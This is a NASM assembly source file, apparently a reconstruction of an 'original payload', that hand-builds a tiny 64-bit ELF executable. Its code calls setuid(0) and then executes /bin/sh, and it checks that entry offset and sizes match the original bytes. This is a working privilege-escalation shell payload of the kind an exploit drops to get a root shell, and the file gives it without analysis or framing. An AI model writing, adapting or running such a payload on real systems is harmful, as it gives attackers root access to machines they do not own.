;;; Build with:
;;;   nasm -f bin payload.asm -o payload.rebuilt.elf

  BITS 64
  org 0

  ;; syscalls used
  SYS_setuid equ 105
  SYS_execve equ 59
  SYS_exit equ 60

;;; make sure the header matches the original payload
ehdr:
  db 0x7F, 'E', 'L', 'F'
  db 2                  ; EI_CLASS   = ELFCLASS64
  db 1                  ; EI_DATA    = ELFDATA2LSB
  db 1                  ; EI_VERSION = EV_CURRENT
  db 0                  ; EI_OSABI   = SYSV
  db 0                  ; EI_ABIVERSION
  times 7 db 0          ; EI_PAD

  dw 2                  ; e_type      = ET_EXEC
  dw 0x3E               ; e_machine   = EM_X86_64
  dd 1                  ; e_version   = EV_CURRENT
  dq 0x400078           ; e_entry
  dq phdr - $$          ; e_phoff
  dq 0                  ; e_shoff
  dd 0                  ; e_flags
  dw 64                 ; e_ehsize
  dw 56                 ; e_phentsize
  dw 1                  ; e_phnum
  dw 0                  ; e_shentsize
  dw 0                  ; e_shnum
  dw 0                  ; e_shstrndx

phdr:
  dd 1                  ; p_type   = PT_LOAD
  dd 5                  ; p_flags  = PF_R | PF_X
  dq 0                  ; p_offset
  dq 0x400000           ; p_vaddr
  dq 0x400000           ; p_paddr
  dq segsize            ; p_filesz
  dq segsize            ; p_memsz
  dq 0x1000             ; p_align


entry:
  ;; setuid(0)
  xor eax, eax
  xor edi, edi                  ; parameter 0
  mov al, SYS_setuid
  syscall

  ;; execv("/bin/sh")
  lea rdi, [rel binsh]          ; "/bin/sh"
  xor esi, esi
  push byte SYS_execve
  pop rax
  cdq
  syscall

  ;; exit(0)
  xor edi, edi                  ; 0 status
  push byte SYS_exit
  pop rax
  syscall

binsh:
  db '/bin/sh', 0

end_load:

  db 0, 0

  segsize  equ end_load - $$
  filesize equ $ - $$

  %if entry - $$ != 0x78
  %error "unexpected entry offset"
  %endif

  %if segsize != 0x9E
  %error "unexpected segment size"
  %endif

  %if filesize != 0xA0
  %error "unexpected file size"
  %endif
